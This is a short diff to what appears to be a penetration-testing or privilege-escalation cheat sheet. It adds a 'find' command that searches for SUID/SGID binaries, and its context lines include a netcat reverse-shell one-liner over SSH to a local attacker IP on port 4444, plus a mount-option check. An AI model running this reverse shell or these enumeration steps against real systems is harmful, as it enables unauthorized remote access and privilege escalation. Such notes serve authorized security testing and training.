@@ -24,6 +24,10 @@ ssh user@$ip nc $localip 4444 -e /bin/sh
 export TERM=linux  
 
 ### Check environment 
+
+Search permissions command(Please remember):
+/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
 Check any restricitions on any folders  
 mount -l        >> any no exec or no suid?  
 
